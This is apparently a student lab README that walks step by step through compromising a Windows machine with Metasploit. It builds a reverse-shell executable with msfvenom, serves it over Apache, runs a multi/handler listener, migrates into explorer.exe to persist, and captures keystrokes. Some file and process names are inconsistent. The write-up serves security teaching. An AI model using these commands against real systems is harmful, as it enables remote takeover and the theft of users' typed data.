# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="954" height="562" alt="Screenshot 2026-02-12 132247" src="https://github.com/user-attachments/assets/41fcc7ef-c772-4f9f-b5c9-7f8551c6c664" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > piggy.exe
## OUTPUT:
<img width="942" height="260" alt="image" src="https://github.com/user-attachments/assets/df0b8b94-f0f7-4e3b-a824-be3db463a79f" />



copy the fun.exe into the apache /var/www/html folder
Start apache2 server
sudo systemctl apache2 start
Check the status of apache2
## OUTPUT:
<img width="1687" height="1027" alt="image" src="https://github.com/user-attachments/assets/ccceaa5f-1ff2-4f9c-a118-4b8cfc64262c" />



Invoke msfconsole:
## OUTPUT:

<img width="1095" height="795" alt="Screenshot 2026-02-12 211608" src="https://github.com/user-attachments/assets/7b9e1f8e-c70c-4bd4-a0c1-69a83e5529b6" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="1176" height="851" alt="Screenshot 2026-02-12 140100" src="https://github.com/user-attachments/assets/6a5b3ba4-54ce-4063-83eb-3fbbef0d5767" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="756" height="236" alt="image" src="https://github.com/user-attachments/assets/81bfcecb-46e3-4bc8-9a7d-f974f4000969" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1900" height="985" alt="Screenshot 2026-02-12 205818" src="https://github.com/user-attachments/assets/91d301a5-6e9f-4aa2-9891-fa3561f11130" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1304" height="801" alt="image" src="https://github.com/user-attachments/assets/f2c9d965-36c0-403a-ab56-2c0012ebcb18" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="401" height="47" alt="image" src="https://github.com/user-attachments/assets/d370f252-5ffb-4fbe-b03f-55968682712a" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="589" height="230" alt="Screenshot 2026-02-12 143710" src="https://github.com/user-attachments/assets/1a4bab98-374a-4bb4-b777-5b13e1b54db4" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:


<img width="1563" height="801" alt="Screenshot 2026-02-12 143806" src="https://github.com/user-attachments/assets/58a155d0-2ad3-474e-918b-9ae202904b7d" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="787" height="93" alt="Screenshot 2026-02-12 210416" src="https://github.com/user-attachments/assets/504bc844-9775-4840-b6af-790bf1fea8f1" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="967" height="399" alt="Screenshot 2026-02-12 210521" src="https://github.com/user-attachments/assets/f3de362c-60d4-4855-928d-f2bd03a36e38" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
